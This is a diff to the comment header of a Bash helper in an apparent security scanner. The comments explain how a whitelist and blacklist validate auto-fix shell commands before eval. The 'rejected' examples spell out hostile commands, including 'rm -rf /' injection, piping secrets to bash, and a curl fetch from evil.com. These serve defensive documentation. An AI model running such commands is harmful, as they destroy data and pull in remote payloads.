@@ -6,20 +6,125 @@ set -euo pipefail
 # Source this file to access safe_exec_command().
 #
 # SECURITY RATIONALE:
-# eval() allows arbitrary command execution. If an attacker modifies reference
-# files (malicious-patterns.json, known-cves.json) or crafts a malicious finding,
-# they can inject shell commands. This module enforces a strict whitelist of
-# allowed commands and validates arguments before execution.
 #
-# USAGE:
+# ClawPinch auto-fix features need to execute shell commands to remediate
+# security findings. However, eval() is inherently unsafe because it allows
+# arbitrary command execution without validation. Attack vectors include:
+#
+#   1. Malicious reference files: If an attacker compromises the supply chain
+#      and modifies malicious-patterns.json or known-cves.json, they could
+#      inject shell commands into the "auto_fix" field of findings.
+#
+#   2. Crafted findings: If a scanner is compromised or buggy, it could emit
+#      findings with malicious auto_fix commands (e.g., "rm -rf /").
+#
+#   3. Configuration injection: User-controlled config values that flow into
+#      auto_fix commands could contain shell metacharacters (;, |, $(), etc).
+#
+# This module implements defense-in-depth through a strict whitelist approach:
+#
+#   • WHITELIST: Only specific command patterns are allowed (regex match)
+#   • BLACKLIST: Dangerous patterns are always blocked (even if whitelisted)
+#   • VALIDATION: Each command type has custom validation logic
+#   • LOGGING: All command attempts are logged for audit trails
+#
+# THE WHITELIST APPROACH:
+#
+# Instead of trying to sanitize arbitrary commands (which is error-prone), we
+# define a finite set of allowed command structures. Each pattern is a regex
+# that matches a specific, safe operation. For example:
+#
+#   Pattern:  ^jq [^|;&$`]+\.json > tmp && mv tmp [^|;&$`]+\.json$
+#   Matches:  jq '.auth=true' config.json > tmp && mv tmp config.json
+#   Rejects:  jq '.auth=true' config.json | sh    (pipe to shell)
+#   Rejects:  jq '.auth=true'; rm -rf /           (command injection)
+#
+# Commands are validated in three stages:
+#   1. Check dangerous patterns (blacklist - always reject)
+#   2. Check whitelist patterns (must match at least one)
+#   3. Run command-specific validation (e.g., chmod must use numeric mode)
+#
+# USAGE EXAMPLES:
+#
 #   source "$(dirname "$0")/helpers/safe_exec.sh"
+#
+#   # JSON modification with jq (most common)
 #   safe_exec_command "jq '.gateway.requireAuth = true' config.json > tmp && mv tmp config.json"
 #
+#   # Fix file permissions
+#   safe_exec_command "chmod 600 /etc/openclaw/secrets.json"
+#
+#   # Backup before modification
+#   safe_exec_command "cp config.json config.json.bak"
+#
+#   # In-place text replacement
+#   safe_exec_command "sed -i 's/bindAddress: 0.0.0.0/bindAddress: 127.0.0.1/' openclaw.conf"
+#
+#   # Clean up temporary files
+#   safe_exec_command "rm /tmp/clawpinch-scan-results.json"
+#
+# REJECTED COMMANDS (examples):
+#
+#   # Command injection via semicolon
+#   safe_exec_command "jq '.auth=true' config.json; rm -rf /"
+#   # → REJECTED: contains dangerous pattern ';'
+#
+#   # Pipe to shell interpreter
+#   safe_exec_command "jq -r '.secrets' config.json | bash"
+#   # → REJECTED: contains dangerous pattern '| bash'
+#
+#   # Command substitution
+#   safe_exec_command "echo $(curl evil.com/payload) > config.json"
+#   # → REJECTED: contains dangerous pattern '$('
+#
+#   # Wildcard glob expansion
+#   safe_exec_command "rm /etc/openclaw/*.json"
+#   # → REJECTED: contains dangerous pattern '*'
+#
+#   # Recursive deletion
+#   safe_exec_command "chmod -R 777 /etc/openclaw"
+#   # → REJECTED: recursive mode not allowed
+#
+# AUDIT LOGGING:
+#
+# All command validation attempts are logged to stderr. To enable persistent
+# audit logging, set the CLAWPINCH_AUDIT_LOG environment variable:
+#
+#   export CLAWPINCH_AUDIT_LOG=/var/log/clawpinch-audit.log
+#   safe_exec_command "chmod 600 secrets.json"
+#   # → [2025-02-06T10:30:45Z] [info] [safe_exec] Executing: chmod 600 secrets.json
+#
 # ADDING NEW COMMANDS:
+#
+# If you need to whitelist a new command type, follow these steps carefully:
+#
 # 1. Add a pattern to _SAFE_EXEC_PATTERNS array
+#    • Use anchors (^ and $) to match the entire command
+#    • Use character class negation [^|;&$`] to block shell metacharacters
+#    • Add inline comments with examples
+#
 # 2. Add validation in _validate_command()
+#    • Add a case for the new command in the switch statement
+#    • Validate all arguments and flags
+#    • Reject dangerous variations (e.g., recursive flags, wildcards)
+#
 # 3. Add test cases to test_safe_exec.sh
+#    • Test valid commands (should succeed)
+#    • Test invalid commands (should be rejected)
+#    • Test boundary cases and injection attempts
+#
 # 4. Document the use case and security considerations
+#    • Explain why the command is needed
+#    • Document attack vectors you've considered
+#    • List any residual risks
+#
+# SECURITY CONSIDERATIONS:
+#
+# • This module still uses eval() internally, but ONLY after strict validation
+# • Regex patterns must be carefully tested to avoid bypasses
+# • New command types increase attack surface — only add when necessary
+# • Consider if the operation can be done without shell execution (e.g., pure bash)
+# • Review threat-model.md before adding command patterns
 
 # ─── Command whitelist patterns ─────────────────────────────────────────────
 # Each pattern is a regex that matches allowed command structures.
